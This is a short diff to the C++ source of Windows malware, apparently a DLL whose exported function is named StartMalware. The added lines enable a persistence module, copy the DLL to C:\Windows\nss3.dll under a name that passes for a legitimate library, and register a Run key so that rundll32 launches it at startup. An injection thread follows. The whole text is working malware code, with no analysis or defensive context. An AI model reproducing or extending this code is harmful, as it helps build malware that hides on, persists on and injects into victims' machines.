@@ -2,7 +2,7 @@
 #include <string>
 #include <thread>
 #include "loader.h"
-//#include "persistence.h"
+#include "persistence.h"
 #include "dynamic_library.h"
 #include "utils.h"
 
@@ -16,7 +16,18 @@ extern "C" __declspec(dllexport) void CALLBACK StartMalware(HWND hwnd, HINSTANCE
         return;
     }
 
-    //WriteRegistryRun("meoware", "C:\\Windows\\System32\\rundll32.exe", GetCurrentDllPath() + ",StartMalware");
+    std::string path = GetCurrentDllPath();
+    std::string target_path = "C:\\Windows\\nss3.dll";
+
+    if (!CopyFile(toUTF16(path).c_str(), toUTF16(target_path).c_str(), FALSE))
+    {
+        Log("log.txt", "[+] loader: self copy failed.\n");
+        WriteRegistryRun("meoware", "C:\\Windows\\System32\\rundll32.exe", path + ",StartMalware");
+    }
+    else
+    {
+        WriteRegistryRun("meoware", "C:\\Windows\\System32\\rundll32.exe", target_path + ",StartMalware");
+    }
 
     Log("log.txt", "[+] loader: create inject thread.\n");
     std::thread threadInjectTargets(RepeatInjectTargets);
